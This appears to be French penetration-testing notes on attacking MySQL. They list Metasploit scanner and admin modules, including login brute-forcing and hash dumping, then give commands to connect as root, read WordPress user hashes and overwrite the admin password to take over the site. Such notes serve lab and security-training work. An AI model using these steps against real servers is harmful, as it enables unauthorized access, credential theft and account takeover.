# MySQL
port : 3306  

``auxiliary/scanner/mysql/mysql_version``  
``auxiliary/scanner/mysql/mysql_login`` : tenter un login  
``auxiliary/admin/mysql/mysql_enum``  
``auxiliary/admin/mysql/mysql_sql``  
``auxiliary/scanner/mysql/mysql_file_enum``  
``auxiliary/scanner/mysql/mysql_hashdump``  
``auxiliary/scanner/mysql/mysql_schemadump``  
``auxiliary/scanner/mysql/mysql_writable_dirs``  

se conneter sur mysql : `mysql -h 192.74.181.3 -u root -p`  
`show databases;`  
`use xxx;`  
`show tables;`  
`select * from wp_users;` : consulter les différents comptes d'utilisateurs WordPress dans la table wp_users  
`UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';` : copier les hachages de mots de passe affichés dans la colonne user_pass . Nous pouvons également modifier le mot de passe de l'utilisateur administrateur afin de pouvoir nous connecter au site WordPress hébergé sur le serveur WAMP identifié  



